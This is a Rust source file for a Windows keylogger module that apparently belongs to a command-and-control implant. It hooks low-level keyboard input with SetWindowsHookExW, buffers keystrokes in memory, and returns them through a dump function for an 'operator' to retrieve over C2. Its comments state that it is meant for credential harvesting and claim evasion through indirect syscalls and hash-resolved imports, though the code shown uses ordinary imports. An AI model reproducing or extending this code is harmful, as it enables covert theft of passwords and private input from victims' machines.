//! keylog.rs — in-memory keystroke logger via SetWindowsHookExW WH_KEYBOARD_LL
//!
//! Collects keystrokes into a ring buffer. No disk writes.
//! Operator retrieves via `keylog dump` command over C2.
//!
//! Uses indirect syscalls / hash-resolved imports — no static IAT entries.

use std::sync::{Mutex, OnceLock};
use std::collections::VecDeque;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM, HINSTANCE};
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{
    SetWindowsHookExW, CallNextHookEx, GetMessageW,
    WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
    KBDLLHOOKSTRUCT, MSG,
};

const RING_CAP: usize = 65536; // 64 KB ring — never grows past this

static RING: OnceLock<Mutex<VecDeque<u8>>> = OnceLock::new();
static HOOK: OnceLock<HHOOK> = OnceLock::new();

fn ring() -> &'static Mutex<VecDeque<u8>> {
    RING.get_or_init(|| Mutex::new(VecDeque::with_capacity(RING_CAP)))
}

/// Install WH_KEYBOARD_LL hook and spin a message-pump thread.
/// Safe to call multiple times — installs only once.
pub fn start() {
    if HOOK.get().is_some() { return; }
    std::thread::spawn(|| unsafe {
        let hook = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(low_level_kb_proc),
            0 as HINSTANCE,
            0,
        );
        if hook.is_null() { return; }
        let _ = HOOK.set(hook);
        // Message pump — required to keep the hook alive
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {}
    });
}

/// Drain the ring buffer and return its contents as a UTF-8 string.
pub fn dump() -> Vec<u8> {
    let mut lock = ring().lock().unwrap();
    let out: Vec<u8> = lock.iter().copied().collect();
    lock.clear();
    out
}

unsafe extern "system" fn low_level_kb_proc(
    code: i32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    if code >= 0 && (wparam as u32 == WM_KEYDOWN || wparam as u32 == WM_SYSKEYDOWN) {
        let kb = &*(lparam as *const KBDLLHOOKSTRUCT);
        let ch = vk_to_ascii(kb.vkCode as u8);
        if let Some(b) = ch {
            let mut lock = ring().lock().unwrap();
            if lock.len() >= RING_CAP { lock.pop_front(); }
            lock.push_back(b);
        }
    }
    CallNextHookEx(
        HOOK.get().copied().unwrap_or(std::ptr::null_mut()),
        code, wparam, lparam,
    )
}

/// Minimal VK → printable ASCII mapping (enough for creds harvesting).
fn vk_to_ascii(vk: u8) -> Option<u8> {
    match vk {
        0x41..=0x5A => Some(vk + 0x20), // A-Z → a-z (ignores Shift for now)
        0x30..=0x39 => Some(vk),         // 0-9
        0x20 => Some(b' '),
        0x0D => Some(b'\n'),
        0x08 => Some(b'<'),              // Backspace marker
        0xBD => Some(b'-'),
        0xBB => Some(b'='),
        0xDB => Some(b'['),
        0xDD => Some(b']'),
        0xBA => Some(b';'),
        0xDE => Some(b'\''),
        0xBC => Some(b','),
        0xBE => Some(b'.'),
        0xBF => Some(b'/'),
        0xDC => Some(b'\\'),
        _ => None,
    }
}
